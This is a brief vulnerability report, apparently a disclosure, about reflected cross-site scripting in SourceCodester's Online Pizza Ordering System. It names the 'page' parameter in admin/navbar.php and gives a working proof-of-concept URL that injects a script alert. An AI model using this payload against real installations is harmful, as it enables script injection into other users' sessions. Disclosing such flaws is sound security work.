vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

Vulnerability trigger parameter: $page

The process of vulnerability discovery is as follows：

![image-20230223212055565](C:\markdown\images\image-20230223212055565.png)

exp

```
http://192.168.31.50/php-opos/admin/navbar.php?page=%27%3E%3C/script%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
```

![image-20230223212008301](C:\markdown\images\image-20230223212008301.png)